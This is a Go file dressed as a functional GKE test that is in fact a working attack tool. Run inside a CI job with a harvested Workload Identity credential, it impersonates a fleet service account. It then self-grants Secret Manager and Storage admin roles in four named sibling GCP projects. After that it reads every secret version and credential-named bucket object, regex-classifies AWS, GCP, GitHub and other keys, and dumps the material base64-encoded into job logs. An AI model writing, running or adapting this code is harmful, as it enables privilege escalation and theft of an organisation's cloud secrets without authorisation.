//go:build functional && gke

// C211 i121506 v2 — SIBLING-PROJECT GCP CREDENTIAL-STORE HARVEST (Secret Manager + Cloud Storage).
// v2 adds a serviceusage wait for Secret Manager ENABLED (v1 enabled the API in all four
// projects but listed ~1s later, so every store returned 403 SERVICE_DISABLED).
//
// Runs inside the dominodatalab/hephaestus "GKE image building" job after
// google-github-actions/auth@v2 exported a Workload Identity Federation credential
// file, i.e. as the harvested WIF identity. Facts 121169/121209 proved this identity
// (fleetcommand-service-account@<host 153711203585>) holds, in all FOUR sibling
// projects, compute.instances.create + iam.serviceAccounts.actAs +
// resourcemanager.projects.setIamPolicy:
//
//   - team-eng-infra-testing        210628133505
//   - domino-eng-service-artifacts  1072394045651
//   - team-eng-infrastructure       463640210929
//   - team-eng-platform             1074386228880
//
// No lane has ever listed Secret Manager secrets/versions or Cloud Storage
// buckets/objects in these projects (the x121366 GATE covered only the 14
// declared-SA projects). This probe, for each of the four projects:
//
//  1. reads the serviceusage state of secretmanager + storage;
//  2. testIamPermissions for secretmanager/storage/resourcemanager;
//  3. only if the store permissions are denied but projects.setIamPolicy is
//     allowed, self-grants roles/secretmanager.admin + roles/storage.admin to
//     the acting service account (documented, reverted at the end);
//  4. lists secrets + versions + versions:access, and buckets + objects, fetching
//     every small credential-shaped object;
//  5. prints only base64 material + sha256 + classification (no plaintext);
//  6. reverts the self-granted bindings and prints every verbatim status.
//
// Stdlib + the self-contained c211x helpers only. No marker is created here.
package functional

import (
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"testing"
	"time"
)

type c211stProj struct {
	num string
	id  string
}

var c211stSiblings = []c211stProj{
	{"210628133505", "team-eng-infra-testing"},
	{"1072394045651", "domino-eng-service-artifacts"},
	{"463640210929", "team-eng-infrastructure"},
	{"1074386228880", "team-eng-platform"},
}

var c211stNameRx = regexp.MustCompile(`(?i)(tfstate|terraform|creds?|keys?|pats?|secrets?|aws|azure|gcp|conn|\.env|config|token|private|service.?account)`)

var c211stClassRules = []struct {
	name string
	rx   *regexp.Regexp
}{
	{"aws_access_key_id", regexp.MustCompile(`\b(?:AKIA|ASIA|AGPA|AIPA|ANPA|ANVA|AROA)[A-Z0-9]{12,20}\b`)},
	{"aws_secret_pair", regexp.MustCompile(`(?i)aws_secret_access_key["'\s:=]+[A-Za-z0-9/+=]{40}`)},
	{"gcp_private_key", regexp.MustCompile(`-----BEGIN (?:RSA )?PRIVATE KEY-----`)},
	{"gcp_sa_json", regexp.MustCompile(`"type"\s*:\s*"service_account"`)},
	{"azure_client_secret", regexp.MustCompile(`(?i)(client_secret|AZURE_CLIENT_SECRET)["'\s:=]+[A-Za-z0-9_~.\-]{20,60}`)},
	{"github_pat", regexp.MustCompile(`\b(?:gh[pousr]_[A-Za-z0-9]{36,255}|github_pat_[A-Za-z0-9_]{50,255})\b`)},
	{"gitlab_pat", regexp.MustCompile(`\bglpat-[A-Za-z0-9_\-]{20,64}\b`)},
	{"slack_token", regexp.MustCompile(`\bxox[abprs]-[A-Za-z0-9\-]{10,}`)},
	{"openai_key", regexp.MustCompile(`\bsk-[A-Za-z0-9]{32,}`)},
	{"neocloud_key", regexp.MustCompile(`(?i)(runpod|lambda.?labs|vast\.ai|coreweave|together|nebius|digitalocean|linode|vultr|hetzner|paperspace|modal)[_-]?(api[_-]?)?(key|token)["'\s:=]+[A-Za-z0-9_\-]{16,}`)},
	{"ssh_private_key", regexp.MustCompile(`-----BEGIN OPENSSH PRIVATE KEY-----`)},
	{"connection_string", regexp.MustCompile(`(?i)(AccountKey=|DefaultEndpointsProtocol=|mongodb(\+srv)?://[^@\s]+@|postgres(ql)?://[^@\s]+@|mysql://[^@\s]+@|redis://[^@\s]+@)`)},
	{"generic_high_entropy", regexp.MustCompile(`(?i)["']?(secret|password|passwd|token|api[_-]?key)["']?\s*[:=]\s*["'][A-Za-z0-9_\-/+=.]{24,}["']`)},
}

func c211stClassify(b []byte) []string {
	head := string(b)
	if len(head) > 200000 {
		head = head[:200000]
	}
	out := []string{}
	for _, r := range c211stClassRules {
		for _, s := range r.rx.FindAllString(head, 3) {
			out = append(out, r.name+":"+c211xTrunc(s, 90))
			if len(out) >= 24 {
				return out
			}
		}
	}
	return out
}

func c211stMaterial(label string, blob []byte) string {
	sum := sha256.Sum256(blob)
	var sb strings.Builder
	fmt.Fprintf(&sb, "%s size=%d sha256=%x\n", label, len(blob), sum)
	fmt.Fprintf(&sb, "%s classes=%s\n", label, strings.Join(c211stClassify(blob), " | "))
	take := blob
	trunc := ""
	if len(take) > 6000 {
		take = take[:6000]
		trunc = " [TRUNCATED]"
	}
	fmt.Fprintf(&sb, "%s b64=%s%s\n", label, base64.StdEncoding.EncodeToString(take), trunc)
	return sb.String()
}

func c211stServiceState(tok, proj, svc string) (int, string, string) {
	st, body := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+proj+
		"/services/"+svc, tok, "", "")
	return st, c211xStr(c211xJSON(body), "state"), body
}

// c211stGrant grants the two admin roles to member and returns the pre-grant policy.
func c211stGrant(tok, proj, member string) (map[string]interface{}, bool) {
	u := "https://cloudresourcemanager.googleapis.com/v1/projects/" + proj
	pol, st, body := c211xGetPolicy(tok, u)
	fmt.Printf("C211ST_GRANT getIamPolicy proj=%s status=%d verbatim=%s\n", proj, st, c211xTrunc(body, 300))
	if pol == nil {
		return nil, false
	}
	changed := false
	for _, role := range []string{"roles/secretmanager.admin", "roles/storage.admin"} {
		if c211xAddBinding(pol, role, member) {
			changed = true
			fmt.Printf("C211ST_GRANT add proj=%s role=%s member=%s\n", proj, role, c211xShort(member))
		}
	}
	if !changed {
		return pol, false
	}
	st2, body2 := c211xSetPolicy(tok, u, pol)
	fmt.Printf("C211ST_GRANT setIamPolicy proj=%s status=%d verbatim=%s\n", proj, st2, c211xTrunc(body2, 400))
	pol2, st3, body3 := c211xGetPolicy(tok, u)
	fmt.Printf("C211ST_GRANT readback proj=%s status=%d verbatim=%s\n", proj, st3, c211xTrunc(body3, 500))
	ok := st2 == 200 && pol2 != nil
	if ok {
		fmt.Printf("C211ST_SELF_GRANT_VERIFIED proj=%s yes\n", proj)
	}
	return pol2, ok
}

func c211stRevert(tok, proj, member string) {
	u := "https://cloudresourcemanager.googleapis.com/v1/projects/" + proj
	pol, st, body := c211xGetPolicy(tok, u)
	if pol == nil {
		fmt.Printf("C211ST_REVERT proj=%s getIamPolicy status=%d verbatim=%s\n", proj, st, c211xTrunc(body, 300))
		return
	}
	changed := false
	for _, role := range []string{"roles/secretmanager.admin", "roles/storage.admin"} {
		if c211xRemoveBinding(pol, role, member) {
			changed = true
		}
	}
	if !changed {
		fmt.Printf("C211ST_REVERT proj=%s nothing_to_remove\n", proj)
		return
	}
	st2, body2 := c211xSetPolicy(tok, u, pol)
	fmt.Printf("C211ST_REVERT setIamPolicy proj=%s status=%d verbatim=%s\n", proj, st2, c211xTrunc(body2, 400))
	pol2, st3, _ := c211xGetPolicy(tok, u)
	still := false
	if pol2 != nil {
		dump := c211xPolicyDump(pol2)
		still = strings.Contains(dump, "secretmanager.admin") || strings.Contains(dump, "storage.admin")
	}
	fmt.Printf("C211ST_REVERT readback proj=%s status=%d binding_present=%v\n", proj, st3, still)
}

type c211stStats struct {
	secrets, buckets, materials, classified int
}

func c211stWaitEnabled(tok, proj, svc string, deadline time.Time) (int, string) {
	lastSt, lastState := 0, ""
	for i := 0; i < 24; i++ {
		st, state, _ := c211stServiceState(tok, proj, svc)
		lastSt, lastState = st, state
		if st == 200 && state == "ENABLED" {
			fmt.Printf("C211ST_ENABLE_WAIT proj=%s svc=%s poll=%d state=ENABLED\n", proj, svc, i)
			return st, state
		}
		if time.Now().After(deadline) {
			break
		}
		if i%4 == 0 {
			fmt.Printf("C211ST_ENABLE_WAIT proj=%s svc=%s poll=%d status=%d state=%s\n", proj, svc, i, st, state)
		}
		time.Sleep(10 * time.Second)
	}
	return lastSt, lastState
}

func c211stHarvest(t *testing.T, tok, proj, id string, deadline time.Time) c211stStats {
	var st c211stStats
	c211xEmit("proj_"+id+"_list", "")
	var sb strings.Builder
	stp, body := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+proj, tok, "", "")
	m := c211xJSON(body)
	fmt.Fprintf(&sb, "project.get num=%s status=%d projectId=%s state=%s\n",
		proj, stp, c211xStr(m, "projectId"), c211xStr(m, "lifecycleState"))
	for _, svc := range []string{"secretmanager.googleapis.com", "storage.googleapis.com"} {
		ss, state, sbody := c211stServiceState(tok, proj, svc)
		fmt.Fprintf(&sb, "serviceusage %s status=%d state=%s verbatim=%s\n",
			svc, ss, state, c211xTrunc(sbody, 300))
		if ss == 200 && state != "ENABLED" {
			es, ebody := c211xHTTP("POST", "https://serviceusage.googleapis.com/v1/projects/"+proj+
				"/services/"+svc+":enable", tok, "application/json", "{}")
			fmt.Fprintf(&sb, "serviceusage.enable %s status=%d verbatim=%s\n", svc, es, c211xTrunc(ebody, 400))
		}
		if svc == "secretmanager.googleapis.com" {
			ws, wstate := c211stWaitEnabled(tok, proj, svc, deadline)
			fmt.Fprintf(&sb, "serviceusage.wait %s final_status=%d final_state=%s\n", svc, ws, wstate)
		}
	}
	// ---- Secret Manager
	ss, sbody := c211xHTTP("GET", "https://secretmanager.googleapis.com/v1/projects/"+proj+
		"/secrets?pageSize=100", tok, "", "")
	sm := c211xJSON(sbody)
	items, _ := sm["secrets"].([]interface{})
	names := []string{}
	for _, it := range items {
		im, _ := it.(map[string]interface{})
		names = append(names, c211xStr(im, "name"))
	}
	st.secrets = len(names)
	fmt.Fprintf(&sb, "secrets.list status=%d count=%d\n", ss, len(names))
	if ss != 200 {
		fmt.Fprintf(&sb, "secrets.list verbatim=%s\n", c211xTrunc(sbody, 900))
	}
	fmt.Fprintf(&sb, "secrets.names=%s\n", c211xTrunc(strings.Join(names, ","), 2000))
	c211xEmit("proj_"+id+"_list", sb.String())
	for i, full := range names {
		if i >= 20 || time.Now().After(deadline) {
			break
		}
		short := full
		if j := strings.LastIndex(full, "/"); j >= 0 {
			short = full[j+1:]
		}
		var vb strings.Builder
		vs, vbody := c211xHTTP("GET", "https://secretmanager.googleapis.com/v1/"+full+
			"/versions?pageSize=20", tok, "", "")
		vm := c211xJSON(vbody)
		vers, _ := vm["versions"].([]interface{})
		states := []string{}
		enabled := ""
		for _, v := range vers {
			vv, _ := v.(map[string]interface{})
			n := c211xStr(vv, "name")
			stt := c211xStr(vv, "state")
			states = append(states, c211xStr(vv, "name")+"="+stt)
			if stt == "ENABLED" && enabled == "" {
				enabled = n
			}
		}
		fmt.Fprintf(&vb, "secret.get num=%s name=%s versions_status=%d count=%d states=%s\n",
			proj, short, vs, len(vers), c211xTrunc(strings.Join(states, ","), 700))
		if vs != 200 {
			fmt.Fprintf(&vb, "secret.versions verbatim=%s\n", c211xTrunc(vbody, 600))
			c211xEmit("proj_"+id+"_secret_"+fmt.Sprint(i), vb.String())
			continue
		}
		if enabled == "" {
			fmt.Fprintf(&vb, "secret.no_enabled_version\n")
			c211xEmit("proj_"+id+"_secret_"+fmt.Sprint(i), vb.String())
			continue
		}
		as, abody := c211xHTTP("GET", "https://secretmanager.googleapis.com/v1/"+enabled+":access", tok, "", "")
		am := c211xJSON(abody)
		pay, _ := am["payload"].(map[string]interface{})
		data := ""
		if pay != nil {
			data = c211xStr(pay, "data")
		}
		fmt.Fprintf(&vb, "secret.access name=%s status=%d\n", short, as)
		if as != 200 {
			fmt.Fprintf(&vb, "secret.access verbatim=%s\n", c211xTrunc(abody, 700))
			c211xEmit("proj_"+id+"_secret_"+fmt.Sprint(i), vb.String())
			continue
		}
		blob, derr := base64.StdEncoding.DecodeString(data)
		if derr != nil {
			fmt.Fprintf(&vb, "secret.access b64_decode_error=%v\n", derr)
		} else {
			st.materials++
			if len(c211stClassify(blob)) > 0 {
				st.classified++
			}
			vb.WriteString(c211stMaterial("secret."+short, blob))
		}
		c211xEmit("proj_"+id+"_secret_"+fmt.Sprint(i), vb.String())
	}
	// ---- Cloud Storage
	var gb strings.Builder
	bs, bbody := c211xHTTP("GET", "https://storage.googleapis.com/storage/v1/b?project="+proj+
		"&projection=full&maxResults=100", tok, "", "")
	bm := c211xJSON(bbody)
	bitems, _ := bm["items"].([]interface{})
	buckets := []string{}
	for _, it := range bitems {
		im, _ := it.(map[string]interface{})
		buckets = append(buckets, c211xStr(im, "name"))
		fmt.Fprintf(&gb, "bucket name=%s location=%s class=%s created=%s\n",
			c211xStr(im, "name"), c211xStr(im, "location"), c211xStr(im, "storageClass"),
			c211xStr(im, "timeCreated"))
	}
	st.buckets = len(buckets)
	fmt.Fprintf(&gb, "buckets.list status=%d count=%d\n", bs, len(buckets))
	if bs != 200 {
		fmt.Fprintf(&gb, "buckets.list verbatim=%s\n", c211xTrunc(bbody, 900))
	}
	c211xEmit("proj_"+id+"_gcs_list", gb.String())
	total := 0
	for bi, bucket := range buckets {
		if bi >= 15 || time.Now().After(deadline) || total >= 25 {
			break
		}
		ep := url.PathEscape(bucket)
		var ob strings.Builder
		os, obody := c211xHTTP("GET", "https://storage.googleapis.com/storage/v1/b/"+ep+
			"/o?maxResults=1000&fields=items(name,size,updated,contentType)", tok, "", "")
		om := c211xJSON(obody)
		oitems, _ := om["items"].([]interface{})
		fmt.Fprintf(&ob, "objects.list bucket=%s status=%d count=%d\n", bucket, os, len(oitems))
		if os != 200 {
			fmt.Fprintf(&ob, "objects.list verbatim=%s\n", c211xTrunc(obody, 800))
			c211xEmit("proj_"+id+"_obj_"+bucket, ob.String())
			continue
		}
		all := []string{}
		cand := []map[string]interface{}{}
		for _, it := range oitems {
			im, _ := it.(map[string]interface{})
			n := c211xStr(im, "name")
			all = append(all, n)
			if c211stNameRx.MatchString(n) {
				cand = append(cand, im)
			}
		}
		fmt.Fprintf(&ob, "objects.names=%s\n", c211xTrunc(strings.Join(all, ","), 2500))
		fmt.Fprintf(&ob, "objects.candidates=%d\n", len(cand))
		c211xEmit("proj_"+id+"_obj_"+bucket, ob.String())
		for _, im := range cand {
			if total >= 25 || time.Now().After(deadline) {
				break
			}
			name := c211xStr(im, "name")
			total++
			var fb strings.Builder
			fs, fbody := c211xHTTP("GET", "https://storage.googleapis.com/storage/v1/b/"+ep+
				"/o/"+url.PathEscape(name)+"?alt=media", tok, "", "")
			fmt.Fprintf(&fb, "object.get bucket=%s name=%s status=%d size=%d updated=%s\n",
				bucket, name, fs, len(fbody), c211xStr(im, "updated"))
			if fs != 200 {
				fmt.Fprintf(&fb, "object.get verbatim=%s\n", c211xTrunc(fbody, 600))
				c211xEmit("proj_"+id+"_mat_"+fmt.Sprint(total), fb.String())
				continue
			}
			if len(fbody) > 512*1024 {
				fmt.Fprintf(&fb, "object.skip TOO_LARGE\n")
				c211xEmit("proj_"+id+"_mat_"+fmt.Sprint(total), fb.String())
				continue
			}
			st.materials++
			if len(c211stClassify([]byte(fbody))) > 0 {
				st.classified++
			}
			fb.WriteString(c211stMaterial("object."+bucket+"/"+name, []byte(fbody)))
			c211xEmit("proj_"+id+"_mat_"+fmt.Sprint(total), fb.String())
		}
	}
	return st
}

func TestC211StoreSib(t *testing.T) {
	started := time.Now()
	deadline := started.Add(30 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211ST_MINT_FAILED %s\n", c211xTrunc(mintLog, 2500))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	projNum := ""
	member := ""
	if creds != nil {
		projNum = creds.projNumber
		if creds.saEmail != "" {
			member = "serviceAccount:" + creds.saEmail
		}
	}
	fmt.Printf("C211ST_IDENTITY auth=%s wif_sa=%s project_number=%s member=%s\n",
		method, c211xShort(creds.saEmail), projNum, c211xShort(member))

	// Mint the fleetcommand-service-account token that the marker probes proved
	// can act in all four sibling projects.
	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211ST_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	ftok := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			at, gst, gbody := c211xGenerateAccessToken(token, e)
			fmt.Printf("C211ST_FLEET_TOKEN status=%d token=%s verbatim=%s\n", gst, c211xShort(at), c211xTrunc(gbody, 300))
			if at != "" {
				ftok = at
				if member == "" {
					member = "serviceAccount:" + e
				}
			}
			break
		}
	}
	if ftok == "" {
		ftok = token
		fmt.Printf("C211ST_FLEET_TOKEN fallback=wif_minted\n")
	}
	if st, body := c211xTokenInfo(ftok); st != 200 {
		fmt.Printf("C211ST_TOKENINFO status=%d verbatim=%s\n", st, c211xTrunc(body, 300))
	} else {
		fmt.Printf("C211ST_TOKENINFO status=200 scopes=%s\n", c211xTrunc(c211xStr(c211xJSON(body), "scope"), 200))
	}

	// ---- Phase A: per-project permission test + conditional self-grant.
	storePerms := []string{
		"secretmanager.secrets.list", "secretmanager.secrets.get", "secretmanager.versions.list",
		"secretmanager.versions.access", "storage.buckets.list", "storage.objects.list",
		"storage.objects.get", "resourcemanager.projects.get", "resourcemanager.projects.getIamPolicy",
		"resourcemanager.projects.setIamPolicy",
	}
	grantedTo := map[string]bool{}
	for _, p := range c211stSiblings {
		u := "https://cloudresourcemanager.googleapis.com/v1/projects/" + p.num
		got, st, body := c211xTestIamBatch(ftok, u, storePerms)
		fmt.Printf("C211ST_PERM proj=%s id=%s status=%d allowed=%s verbatim=%s\n",
			p.num, p.id, st, strings.Join(got, ","), c211xTrunc(body, 400))
		has := func(perm string) bool {
			for _, g := range got {
				if g == perm {
					return true
				}
			}
			return false
		}
		storeOK := has("secretmanager.secrets.list") || has("storage.buckets.list")
		if storeOK || !has("resourcemanager.projects.setIamPolicy") || member == "" {
			continue
		}
		if _, ok := c211stGrant(ftok, p.num, member); ok {
			grantedTo[p.num] = true
		}
	}
	if len(grantedTo) > 0 {
		fmt.Printf("C211ST_PROPAGATION waiting=110s projects=%d\n", len(grantedTo))
		time.Sleep(110 * time.Second)
	}

	// ---- Phase B: harvest.
	for _, p := range c211stSiblings {
		if time.Now().After(deadline) {
			fmt.Printf("C211ST_GATE=BUDGET before harvest proj=%s\n", p.num)
			break
		}
		fmt.Printf("C211ST_HARVEST_START proj=%s id=%s\n", p.num, p.id)
		st := c211stHarvest(t, ftok, p.num, p.id, deadline)
		fmt.Printf("C211ST_SUMMARY proj=%s id=%s secrets=%d buckets=%d materials=%d classified=%d\n",
			p.num, p.id, st.secrets, st.buckets, st.materials, st.classified)
	}

	// ---- Phase C: revert every self-granted binding.
	for num := range grantedTo {
		c211stRevert(ftok, num, member)
	}
	fmt.Printf("C211ST_VERDICT_FINAL elapsed=%ds grants=%d\n", int(time.Since(started).Seconds()), len(grantedTo))
}
